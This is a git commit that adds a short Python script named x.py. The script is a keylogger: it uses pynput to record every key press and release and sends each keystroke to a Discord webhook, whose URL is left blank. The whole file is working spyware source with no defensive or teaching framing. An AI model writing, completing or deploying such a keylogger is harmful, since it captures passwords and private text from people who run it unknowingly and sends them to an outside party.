b225dd62010b76f494d87887b43f37a101052f5d
Onur Epbaygun <97338881+MetinBaygun@users.noreply.github.com>
2025-01-09 07:52:34 +0300

    Create x.py

---
+++ x.py
@@ -0,0 +1,31 @@
+from dhooks import Webhook
+from pynput import keyboard
+
+hook = Webhook("")
+
+def on_press(key):
+    try:
+        hook.send('alphanumeric key {0} pressed'.format(
+            key.char))
+    except AttributeError:
+        hook.send('special key {0} pressed'.format(
+            key))
+
+def on_release(key):
+    hook.send('{0} released'.format(
+        key))
+    if key == keyboard.Key.esc:
+        # Stop listener
+        return False
+
+# Collect events until released
+with keyboard.Listener(
+        on_press=on_press,
+        on_release=on_release) as listener:
+    listener.join()
+
+# ...or, in a non-blocking fashion:
+listener = keyboard.Listener(
+    on_press=on_press,
+    on_release=on_release)
+listener.start()
